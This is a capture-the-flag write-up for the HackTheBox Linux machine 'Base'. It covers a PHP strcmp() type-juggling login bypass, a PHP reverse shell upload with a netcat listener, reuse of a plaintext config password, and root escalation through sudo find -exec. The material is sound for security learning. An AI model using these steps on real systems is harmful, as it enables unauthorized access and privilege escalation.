# Base

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine running a web application with a PHP login vulnerable 
to type juggling via strcmp() bypass. File upload allows executing 
a reverse shell. Credentials found in a config file allow lateral 
movement to john. Privilege escalation achieved by abusing sudo 
permissions on the find command.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -sCV -p- 10.129.25.14
```

**Open ports:**

| Port | Service |
|------|---------|
| 22 | SSH OpenSSH 7.6p1 |
| 80 | HTTP Apache 2.4.29 |

---

## 2. Web Enumeration

Found login page at `/login/login.php`.

Downloaded swap file from the login directory:

```bash
cat login.php.swp
```

Identified `strcmp()` function used for authentication — vulnerable
to PHP type juggling.

---

## 3. Authentication Bypass

Intercepted login request with Burp Suite and modified parameters:
username[]=a&password[]=a

When `strcmp()` receives an array instead of a string it returns
NULL which evaluates as 0 (equal), bypassing authentication.

---

## 4. Reverse Shell Upload

Uploaded PHP reverse shell through the file upload feature.

Started listener:

```bash
nc -lvnp 4444
```

Triggered shell by navigating to:
http://10.129.25.14/_uploaded/reverse-shell.php

Upgraded to interactive shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 5. Lateral Movement

Found credentials in config file:

```bash
cat /var/www/html/login/config.php
# Password: thisisagoodpassword
```

Switched to john:

```bash
su john
# Password: thisisagoodpassword
```

Retrieved user flag:

```bash
cat /home/john/user.txt
```

---

## 6. Privilege Escalation

Checked sudo permissions:

```bash
sudo -l
# (root:root) /usr/bin/find
```

Exploited find with -exec to spawn root shell:

```bash
sudo find / -exec /bin/bash \; -quit
```

Retrieved root flag:

```bash
cat /root/root.txt
```

---

## 7. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Burp Suite | Authentication bypass |
| php-reverse-shell | Remote code execution |
| netcat | Reverse shell listener |
| find | Privilege escalation |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| PHP Type Juggling | strcmp() bypass via array input |
| Unrestricted File Upload | PHP shell uploaded and executed |
| Plaintext Credentials | Password stored in config.php |
| Sudo Misconfiguration | find allowed as root via sudo |
